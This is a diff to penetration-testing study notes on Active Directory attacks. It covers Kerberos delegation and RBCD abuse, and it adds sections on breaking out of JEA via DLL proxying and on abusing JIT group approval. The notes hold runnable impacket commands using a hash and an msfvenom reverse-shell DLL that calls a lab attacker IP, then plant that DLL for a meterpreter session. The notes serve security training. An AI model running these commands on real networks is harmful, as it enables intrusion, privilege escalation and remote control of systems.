@@ -4935,7 +4935,11 @@ Valid starting       Expires              Service principal
 05/18/2020 15:12:38  05/19/2020 01:12:38  krbtgt/CORP1.COM@CORP1.COM
 ```
 
-To discard all cached tickets for the current user, use the `kdestroy` command without parameters.
+Discard all cached tickets for the current user,
+
+```bash
+kdestroy
+```
 
 Get a list of available Service Principal Names (SPN) from the domain controller using Kerberos authentication (It may ask for an LDAP password, but if we just hit enter at the prompt, it will continue and use Kerberos for authentication)
 
@@ -7639,7 +7643,7 @@ Abuse a compromise of the IISSvc account to gain access to the MSSQL instance on
 
 **Kekeo** by Mimikatz also provides access to S4U extension abuse.
 
-We only need the password hash of the IISSvc account in order to exploit the account.
+We only need the **password hash of the IISSvc account** in order to exploit the account.
 
 If we only have the clear text password, we can generate the NTLM hash with Rubeus:
 
@@ -7707,6 +7711,10 @@ The same attack against constrained delegation applies to RBCD if we can comprom
 
 E.g., A RBCD attack that leads to code execution on appsrv01.
 
+```pwsh
+Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
+```
+
 Starts by compromising a domain account that has the **GenericWrite** access right on a computer account object (user dave)
 
 ```pwsh
@@ -7761,7 +7769,7 @@ The SID is the last portion of a security descriptor string.
 Use the **RawSecurityDescriptor** class to instantiate a **SecurityDescriptor** object:
 
 ```pwsh
-$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
+$sid = Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
 
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
 ```
@@ -7770,6 +7778,7 @@ Convert it into a byte array to match the format for the msDS-AllowedToActOnBeha
 
 ```pwsh
 $SDbytes = New-Object byte[] ($SD.BinaryLength)
+
 $SD.GetBinaryForm($SDbytes,0)
 ```
 
@@ -9087,6 +9096,7 @@ Export the new ticket to our KRB5CCNAME variable and verify our access on SQL01
 
 ```bash
 export KRB5CCNAME=administrator@mssqlsvc_sql01.corp.com:1433@CORP.COM.ccache
+
 impacket-mssqlclient sql01.corp.com -k
 ```
 
@@ -9164,12 +9174,12 @@ Get-DomainObject -Identity corp -Properties ms-DS-MachineAccountQuota
 
 Normally, the computer account object is created when a physical computer is joined to the domain. However, we can create the object itself with the `impacket-addcomputer` command directly from Kali, using either the clear text password or NTLM hash of a domain user.
 
-If performing the attack from Windows, we can use the `New-MachineAccount` method of the `Powermad.ps` PowerShell script to avoid possible issues with DNS.
+If performing the attack from Windows, we can use the `New-MachineAccount` method of the `Powermad.ps1` PowerShell script to avoid possible issues with DNS.
 
 Simulate that we've dumped the NTLM hash for the mary user and use it to create a new computer called **myComputer** with the password h4x.
 
 ```bash
-impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
+impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778 -dc-ip 192.168.206.100
 ```
 
 Since mary has GenericWrite on the BACKUP01 computer object, edit the **msDS-AllowedToActOnBehalfOfOtherIdentity** on it.
@@ -9191,7 +9201,7 @@ myComputer$ can now impersonate users on BACKUP01$ via S4U2Proxy.
 Use the CIFS SPN and impersonate the administrator user by sending the request with our own myComputer object.
 
 ```bash
-impacket-getST -spn cifs/backup01.corp.com -impersonate administrator 'corp.com/myComputer$:h4x'
+impacket-getST -spn cifs/backup01.corp.com -impersonate administrator 'corp.com/myComputer$:h4x' -dc-ip 192.168.206.100
 ```
 
 With the `administrator.ccache` ticket stored in Kali, add it to the **KRB5CCNAME** variable
@@ -9205,3 +9215,509 @@ Use our CIFS access to obtain code execution on BACKUP01, i.e. perform a **netwo
 ```bash
 impacket-psexec administrator@backup01.corp.com -k -no-pass
 ```
+
+## Just Enough Administration (JEA)
+
+JEA (was introduced in Windows Server 2016) gives the user access to the specific required commands and nothing more.
+
+JEA allows delegated administration via PowerShell, and can be set up on both servers and clients.
+
+JEA also supports logging, which allows system administrators to monitor actions done by the JEA enabled user.
+
+For JEA to function, 3 main things must be done:
+
+2 files must be created:
+
+1. **Session Configuration File**: has the `.pssc` extension and will be used to register the configuration later.
+
+E.g. A default file created with the `New-PSSessionConfigurationFile` command in PowerShell.
+
+```
+...
+# Session type defaults to apply for this session configuration. Can be 'RestrictedRemoteServer' (recommended), 'Empty', or 'Default'
+SessionType = 'Default'
+
+# Directory to place session transcripts for this session configuration
+# TranscriptDirectory = 'C:\Transcripts\'
+
+# Whether to run this session configuration as the machine's (virtual) administrator account
+# RunAsVirtualAccount = $true
+
+# Scripts to run when applied to a session
+# ScriptsToProcess = 'C:\ConfigData\InitScript1.ps1', 'C:\ConfigData\InitScript2.ps1'
+
+# User roles (security groups), and the role capabilities that should be applied to them when applied to a session
+# RoleDefinitions = @{ 'CONTOSO\SqlAdmins' = @{ RoleCapabilities = 'SqlAdministration' }; 'CONTOSO\SqlManaged' = @{ RoleCapabilityFiles = 'C:\RoleCapability\SqlManaged.psrc' }; 'CONTOSO\ServerMonitors' = @{ VisibleCmdlets = 'Get-Process' } } 
+
+}
+```
+
+- **SessionType**: If set to **RemoteRestrictedServer** (recommended), the session will then operate in **NoLanguageMode** and have access to only a few key commands. If set to **Default**, the session will run in **FullLanguageMode** => dangerous as it permits all language elements in the session with administrative context.
+
+- Where the **Transcripts** will be stored: used to keep track of who uses JEA, what commands they run, etc.
+
+- Whether to use a **Virtual Account** or not: By default, this setting is commented out. It is recommended to configure this since virtual accounts are one-time temporary accounts on the system. The user connecting to JEA does not need to know the credentials for the virtual account and once the JEA session ends, the virtual account will also get destroyed. By default, virtual accounts belong to the **Administrators** group on the machine.
+
+- **RoleDefinition**: define who has access to use the JEA configuration, normally populated by groups found in Active Directory.
+
+2. **Role Capabilities File** is created with the `New-PSRoleCapabilityFile` command in PowerShell: specify what commands the user or groups are allowed to run on the machine.
+
+```
+...
+# Cmdlets to make visible when applied to a session
+# VisibleCmdlets = 'Invoke-Cmdlet1', @{ Name = 'Invoke-Cmdlet2'; Parameters = @{ Name = 'Parameter1'; ValidateSet = 'Item1', 'Item2' }, @{ Name = 'Parameter2'; ValidatePattern = 'L*' } }
+...
+# Providers to make visible when applied to a session
+# VisibleProviders = 'Item1', 'Item2'
+...
+```
+
+- **VisibleCmdLets**: holds the commands that will be visible for the user connecting to the specific JEA configuration.
+
+E.g., If a user is allowed to run the `Start-Process` command with no validation on which process they can start, they may be able to start malicious processes.
+
+If the user is able to get a shell on the machine using their JEA configuration, they will receive the shell in an **administrative context** => escalate their privileges at the same time.
+
+- **PowerShell providers** extend the PowerShell environment to let users manage and interact with various data sources. => permit common PowerShell commands to manage diverse data types (e.g. the system registry and file system).
+
+Because no PowerShell providers are available by default in JEA sessions, the **VisibleProviders** line is commented out.
+
+A list of the PowerShell providers can be found with:
+
+```pwsh
+Get-PSProvider
+```
+
+```
+Name                 Capabilities                                      Drives
+----                 ------------                                      ------
+Registry             ShouldProcess, Transactions                       {HKLM, HKCU}
+Alias                ShouldProcess                                     {Alias}
+Environment          ShouldProcess                                     {Env}
+FileSystem           Filter, ShouldProcess, Credentials                {C, D, E, H}
+Function             ShouldProcess                                     {Function}
+Variable             ShouldProcess                                     {Variable}
+```
+
+E.g., If a user is given access to the **FileSystem** provider, they will have access to the entire file system. However, what the user can do may still be severely restricted based on the available commands in the session.
+
+Register the configuration with the `Register-PSSessionConfiguration` command, where the system administrator will point to the required `*.pssc` file.
+
+Once registered, the **WinRM** service will restart, and the machine will be available via JEA.
+
+### Enumerating and Breaking out of JEA
+
+1. JEA is dependent on **PS-Remoting** => run scans in the network to check which machines have the required ports open.
+
+2. Enumerate groups, GPOs, users etc., in the domain which may have descriptive names and description fields.
+
+3. Check the PowerShell history on any machine possible
+
+Finding location of PowerShell history
+
+```pwsh
+(Get-PSReadlineOption).HistorySavePath
+```
+
+Reading the PowerShell history for mary
+
+```pwsh
+type C:\Users\mary\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+```
+Enter-PSSession -ComputerName files02 -ConfigurationName j_fs02
+copy-item -path C:\shares\engineering_old\scripts\start.ps1.bak -destination C:\shares\home\mary
+exit
+h:
+type .\start.ps1.bak
+exit
+```
+
+=> mary initiated a connection to the FILES02 machine previously. 
+
+Use the same `Enter-PSSession` command and connect to JEA on FILES02 as mary
+
+```pwsh
+Enter-PSSession -ComputerName files02 -ConfigurationName j_fs02
+```
+
+Try to run standard PowerShell commands as mary
+
+```pwsh
+whoami
+
+[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+```
+
+```
+The term 'whoami.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the
+spelling of the name, or if a path was included, verify that the path is correct and try again.
+...
+The syntax is not supported by this runspace. This can occur if the runspace is in no-language mode.
+```
+
+Connect via WinRM using the `-ConfigurationName` flag + operating in a **NoLanguageMode**
+
+=> We are likely restricted by JEA.
+
+If the SessionType in JEA is set to **Default**, we would operate in **FullLanguage** mode and be able to create our own functions. With a JEA configuration => full administrative access to the target.
+
+Checking which commands mary can run on FILES02
+
+```pwsh
+Get-Command
+```
+
+```
+CommandType     Name                                               Version    Source
+-----------     ----                                               -------    ------
+Function        Clear-Host
+Function        Exit-PSSession
+Function        Get-Command
+Function        Get-FormatData
+Function        Get-Help
+Function        Measure-Object
+Function        Out-Default
+Function        Select-Object
+Cmdlet          Copy-Item                                          3.0.0.0    Microsoft.PowerShell.Management
+```
+
+The functions on the left side are the current commands available by **default** when JEA is set up with **RestrictedRemoteServer**. However, the `Copy-Item` is not default and is likely set up by the system administrator.
+
+Note: The commands available to us will be executed with **administrative privileges** on the machine.
+
+If there is no validation on what exactly mary can copy, we may be able to copy files from the entire file system.
+
+According to the PowerShell history earlier, mary copied a file from the `C:\shares\engineering_old\scripts\` share.
+
+The home folder for domain users is also stored in FILES02, which includes mary's.
+
+=> easily verify whether we can copy other files on the machine.
+
+Copy the `hosts` file on FILES02.
+
+```pwsh
+Copy-Item -Path 'C:\Windows\System32\drivers\etc\hosts' -Destination 'C:\shares\home\mary'
+```
+
+Go back to the PowerShell prompt on CLIENT02 since the one we have on FILES02 will not allow us to list the directory.
+
+We successfully copied the hosts file to mary's home folder.
+
+```pwsh
+type \\files02\home$\mary\hosts
+```
+
+The access we have on FILES02 can be compared to having administrative access via CIFS, which can often be turned into code execution as SYSTEM.
+
+However, one major disadvantage is that we have no easy way of traversing the file system to check which files are present, or what is installed.
+
+Given the administrative permissions, add a malicious payload to the `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\` folder. By default, anything stored in the folder will be executed under the context of the user logging in. However, this does not guarantee high privileges and the chances that someone will log in to the server is rather small.
+
+=> **DLL hijacking** makes use of the DLL search order in Windows.
+
+Normally, DLL hijacking is performed to gain some sort of access to a target machine or to escalate privileges if weak folder permissions exist where the DLL is found.
+
+When a service or application starts, it normally loads several DLL files to function correctly, including DLLs located by default in Windows.
+
+The DLL search order is as shown:
+
+1.	The directory from which the application is loaded (E.g. `C:\Program Files\application`)
+2.	The system directory (`C:\Windows\System32`)
+3.	The 16-bit system directory
+4.	The Windows directory
+5.	The current directory
+6.	Directories that are listed in the PATH environment variable
+
+Find out which non-existent DLLs Windows is attempting to load from the directory where the service is loaded => add our own DLL containing a payload.
+
+After doing enumeration on the **FILES02** machine, FileZilla-Server is installed and running version 1.7.0.
+
+FileZilla-Server is already installed on **CLIENT01**, use **Process Monitor** to monitor which DLLs are attempted to be loaded and missing from the application directory upon starting the service.
+
+Administrative permissions are required for this, log in to CLIENT01 with the adam user.
+
+Set up 2 filters:
+
+1. Result contains "NAME NOT FOUND"
+2. Path ends with .dll
+ 
+Start the FileZilla-Server service. (Find the `filezilla-server.exe`)
+
+=> FileZilla service attempts to load 6 DLLs from the directory where it is loaded, which is expected.
+
+Since we have write privileges to the `C:\Program Files\FileZilla Server\` folder.
+
+Which DLL to replace depends on several factors. As the DLLs are typically loaded as a part of the process of starting a service, the OS loads the required DLLs into the process's address space before the main function begins executing. This allows the process to call functions in those DLLs as soon as it starts running.
+
+If a DLL fails to load correctly, it can cause the service to fail, i.e. the service may crash before it gets to the point where it would execute the code in our custom DLL.
+
+Use a technique referred to as **DLL proxying**. This leverages the DLL search order in the same way, but the malicious DLL will forward calls to the legitimate DLL to avoid disrupting the service's normal operation.
+
+Finding which DLL to create may require some **trial and error**. In our case, it appears we can replace 3/6 possible DLLs to obtain a shell on CLIENT01 while 2 of them allow the service to start.
+
+Create a payload following the naming of `msasn1.dll` with msfvenom
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.48.4 LPORT=443 -a x64 --platform windows -f dll > msasn1.dll
+```
+
+After testing this on CLIENT01 and successfully getting a shell, move back to CLIENT02, where we are logged in with the mary user.
+
+Use the JEA configuration to copy the file to the `C:\Program Files\FileZilla Server\` directory on FILES02.
+
+```pwsh
+copy-item C:\shares\home\mary\msasn1.dll -destination "C:\Program Files\FileZilla Server\msasn1.dll"
+```
+
+Wait for someone to restart the target machine. Or simulate the restart by logging in to FILES02 as the adam user.
+
+```
+meterpreter > sysinfo
+meterpreter > getuid
+```
+
+`Invoke-Expression`, `Start-Process`, and `Invoke-Command` are just a few that should be avoided due to their potential misuse.
+
+## Just-In-Time (JIT) Access
+
+Just-In-Time (JIT) Administration, when used with AD, enhance security by providing **temporary**, limited administrative access to resources.
+
+E.g., A user that must log in to certain machines and perform maintenance, which often requires administrative privileges. One way to provide the access is to add the user to the **local administrators group** on the machines, either locally or via a domain GPO.
+
+However, if the access is to be revoked afterward, this normally requires manual work. If the access is not revoked, the account will remain high privileged.
+
+With JIT, users are granted privileges for a limited amount of time to perform a specific task, and once the time is up, the privileges are revoked automatically.
+
+When we worked with JEA, we did not have any specific information to gather since JEA is enforced by PowerShell.
+
+When JIT is used in combination with AD, however, the Privileged Access Management Feature (PAM) must be enabled. Upon enabling the feature, it writes certain attributes that we can enumerate as a standard user. Note that once PAM is enabled in AD, it cannot be disabled again.
+
+Note: Microsoft has their own solution that supports JIT called Microsoft Identity Management (MIM).
+
+Complex setup => Many org use 3rd-party applications that offer many of the same features, such as CyberARk or BeyondTrust. Along with JIT, these applications typically offer password vaults, bitlocker, encryption, firewalls, LAPS, ...
+
+### Enumerating and Exploiting JIT
+
+Even though JIT requires that PAM is enabled in the domain, having it enabled is not a guaranteed indicator that JIT is in use since PAM also supports other features.
+
+Note: Exploitation of JIT solutions often happens in the later stages of an assessment. Even though some JIT solutions may offer an automatic approval of group membership via a self-service portal, most of them require that someone else approves the request on behalf of the user.
+
+=> May have to compromise several accounts to take advantage of the solution unless the solution itself has a vulnerability that we can exploit directly.
+
+Log in to CLIENT01 with the mary user, simulating that we've obtained access to an unlocked computer.
+
+Use the Active Directory PowerShell Module to perform enumeration on what features are enabled in the domain.
+
+The AD PowerShell Module is often used by system administrators to manage AD via PowerShell and is a part of the Remote Server Administration Tools (RSAT).
+
+RSAT mostly requires administrative privileges, but simply loading the DLL used for Active Directory management does not.
+
+As a standard user, we are not allowed to make changes in the domain, and the commands we have available are somewhat limited.
+
+To obtain information,review the possible `Get-*` commands in the module. Note that this type of enumeration can be performed by any user in the domain.
+
+The `Microsoft.ActiveDirectory.Management.dll` is located in the `C:\Tools` folder. After importing it to memory, let's run `Get-Command` and review the `Get-*` commands available.
+
+```pwsh
+Import-Module C:\Tools\Microsoft.ActiveDirectory.Management.dll -Verbose
+```
+
+```pwsh
+Get-Command -Module Microsoft.ActiveDirectory.Management | Where-Object { $_.Name -like "Get-*" }
+```
+
+```
+CommandType     Name                                               Version    Source
+-----------     ----                                               -------    ------
+...
+Cmdlet          Get-ADGroup                                        10.0.0.0   Microsoft.ActiveDirectory.Management
+Cmdlet          Get-ADGroupMember                                  10.0.0.0   Microsoft.ActiveDirectory.Management
+Cmdlet          Get-ADObject                                       10.0.0.0   Microsoft.ActiveDirectory.Management
+Cmdlet          Get-ADOptionalFeature                              10.0.0.0   Microsoft.ActiveDirectory.Management
+Cmdlet          Get-ADOrganizationalUnit                           10.0.0.0   Microsoft.ActiveDirectory.Management
+Cmdlet          Get-ADPrincipalGroupMembership                     10.0.0.0   Microsoft.ActiveDirectory.Management
+Cmdlet          Get-ADReplicationAttributeMetadata                 10.0.0.0   Microsoft.ActiveDirectory.Management
+Cmdlet          Get-ADReplicationConnection                        10.0.0.0   Microsoft.ActiveDirectory.Management
+Cmdlet          Get-ADReplicationFailure                           10.0.0.0   Microsoft.ActiveDirectory.Management
+...
+```
+
+Run `Get-ADOptionalFeature` to get what features are enabled in the domain.
+
+```pwsh
+Get-ADOptionalFeature -Filter *
+```
+
+```
+...
+FeatureGUID        : ec43e873-cce8-4640-b4ab-07ffe4ab5bcd
+RequiredForestMode : Windows2016Forest
+IsDisableable      : False
+FeatureScope       : {ForestOrConfigurationSet}
+DistinguishedName  : CN=Privileged Access Management Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=corp,DC=com
+Name               : Privileged Access Management Feature
+ObjectClass        : msDS-OptionalFeature
+ObjectGuid         : 1ceabe8d-4564-4e67-9322-c9a7716d16e8
+PropertyNames      : {DistinguishedName, EnabledScopes, FeatureGUID, FeatureScope...}
+PropertyCount      : 10
+```
+
+Find that the Privileged Access Management is enabled, and it can not be disabled again.
+
+Find traces of JIT by thoroughly enumerate users, groups, GPOs, description fields, etc.
+
+Information about a JIT solution may also come from an assumed breach penetration test or from websites visited on compromised clients, etc.
+
+Simulate that we've performed the required enumeration and found a JIT manager application on MGMT01 based on mary's browser history.
+
+Visiting `http://mgmt01` reveals the web application.
+ 
+mary has previously requested access to the sql_admins group, and according to the status, it has been approved by someone.
+
+Reviewing the **RequestedTimespan**, it appears that the access lasted 1 hour.
+
+Enumerating which groups mary is currently a member of, find no trace of the sql_admins group.
+
+```pwsh
+Get-NetUser mary | select memberof
+```
+
+```
+memberof
+--------
+{CN=j_request,OU=CorpGroups,DC=corp,DC=com, CN=j_fs02,OU=CorpGroups,DC=corp,DC=com, CN=Engineering,OU=CorpGroups,DC=corp,DC=com}
+```
+
+Find that the user is a part of the j_request group, which may be a required group that allows the user to request access via the web application.
+
+Enumerating users of the j_approve group, notice that james is a member of j_approve.
+
+```pwsh
+Get-NetGroup j_approve | select member
+```
+
+james can likely approve incoming requests. However, requests may also be configured to happen automatically, adding more trust to the user account logging in.
+
+Clicking **Create New Request** in the web application.
+
+The group name sql_admins is somewhat descriptive (it gives high privileges to SQL instances in the domain). However, the Web01 and Clients are more cryptic.
+
+If we make a request to Web01 or Client and have it approved, we'd need to perform additional enumeration once we are added to the groups.
+
+When groups are used to grant access to various resources in the domain, it often is handled by Group Policy. While a GPO can be set directly on machines, they are typically set via the domain, making it easier for system administrators to manage them.
+
+Enumerate the GPOs available in the domain.
+
+```pwsh
+Get-NetGPO | select displayname
+```
+
+```
+displayname
+-----------
+Default Domain Policy
+Default Domain Controllers Policy
+EngineeringShare
+l_web01
+l_clients
+```
+
+Enumerating the l_web01 GPO
+
+```pwsh
+Get-NetGPO l_web01
+```
+
+```
+displayname              : l_web01
+objectclass              : {top, container, groupPolicyContainer}
+gpcfunctionalityversion  : 2
+showinadvancedviewonly   : True
+name                     : {99EC2AB4-0FD4-406E-8FDA-BE451DEB2AA6}
+flags                    : 0
+cn                       : {99EC2AB4-0FD4-406E-8FDA-BE451DEB2AA6}
+gpcfilesyspath           : \\corp.com\SysVol\corp.com\Policies\{99EC2AB4-0FD4-406E-8FDA-BE451DEB2AA6}
+distinguishedname        : CN={99EC2AB4-0FD4-406E-8FDA-BE451DEB2AA6},CN=Policies,CN=System,DC=corp,DC=com
+versionnumber            : 8
+instancetype             : 4
+objectguid               : 29eeada0-a267-4b70-88d3-8d666c7bc433
+objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=corp,DC=com
+```
+
+When a GPO is created, the **gpcfilesyspath** attribute is automatically set in Active Directory. This attribute specifies the path in the SYSVOL share on the domain controller where the files for the GPO are stored. This allows the policy settings defined within the GPO to be replicated and made accessible to all domain controllers in the domain.
+
+By default, normal domain users also have read access to the share, which includes the `Groups.xml` file associated with the GPO. This is because the SYSVOL folder needs to be accessible to all users for them to apply the GPO.
+
+Reading the `Groups.xml` file for l_web01 GPO
+
+```pwsh
+cat '\\corp.com\SysVol\corp.com\Policies\{99EC2AB4-0FD4-406E-8FDA-BE451DEB2AA6}\Machine\Preferences\Groups\Groups.xml'
+```
+
+```
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
+<Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2023-05-23 07:30:56" uid="{8002AB14-6BEF-4EDA-B90F-3DE94907B006}" userContext="0" removePolicy="0">
+<Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
+<Members>
+<Member name="CORP\la_web" action="ADD" sid="S-1-5-21-3515682028-2106700410-3524882512-7604"/>
+</Members>
+</Properties>
+<Filters>
+<FilterComputer bool="AND" not="0" type="NETBIOS" name="WEB01"/>
+</Filters>
+</Group>
+</Groups>
+```
+
+=> GPO is configuring the built-in **Administrators** group on a specific machine in the domain. In the Members section, it's adding the group **la_web** to the Administrators group, which grants the group administrative privileges on the affected machine.
+
+The **Filter** section specifies the scope of this policy and it appears to only apply to a computer with the NetBIOS name **WEB01**.
+
+=> This policy ensures that the group is added as an administrator on this specific machine.
+
+After further enumeration, we also find that the l_clients group gives local administrator access on clients, which in this case, is CLIENT01 and CLIENT02.
+
+Note: We have a simulated breach on CLIENT01 as the low-privileged mary user, but during an assessment, we don't necessarily know the password for the account.
+
+If we request access via JIT to Clients and it's approved, we should be local administrator on both CLIENT01 and CLIENT02. However, this requires us to **refresh our Kerberos TGT ticket**.
+
+- For clients, we have to log out of the system and back again. Without credentials, this would be tricky.
+
+- The sql_admins gives access to the MSSQL instance on SQL01 and it uses a remote login. If our user is added to the sql_admins group in AD, we can simply purge our existing Kerberos tickets with `klist purge`, initiate the login, and have a new TGT assigned.
+
+- The same goes for WEB01 since it has WinRM enabled, which supports Kerberos authentication.
+
+Click the "Create New Request" button and choose the Web01 privilege.
+
+As expected, the status is pending and the request must be approved by someone. Some JIT applications add more trust to the user itself, then automatically add the user to the requested group. More often, however, a team member or a system administrator must approve the request.
+
+We could wait for the request to be approved by someone or potentially social engineer someone into approving the request.
+
+Simulate this by logging in to CLIENT02 using the james user > visit `http://mgmt01` and click the **Review Requests** button that shows the request from mary > approve the request and wait.
+
+The current ticket for mary does not contain the new group membership. A new ticket can be retrieved by logging out and back in again, or clearing the current Kerberos ticket cache and obtain a new one when attempting to connect to the remote machine.
+
+Clear the existing Kerberos ticket cache for mary on CLIENT01.
+
+```pwsh
+klist purge
+```
+
+Connecting to WEB01 using WinRM
+
+```pwsh
+Enter-PSSession -ComputerName WEB01
+```
+
+```
+[WEB01]: PS C:\Users\mary\Documents> hostname
+[WEB01]: PS C:\Users\mary\Documents> whoami /groups
+```
+
+We are now a part of the `BUILTIN\Administrators` on WEB01 because of the la_web group membership.
+
+Note that refreshing TGTs may not always be a simple task unless we have access to clear text passwords or we can use NTLM authentication with pass-the-hash techniques.
+
+JIT often yields access to high-privileged groups, which can result in privilege escalation and lateral movement in the domain due to group membership on additional machines.
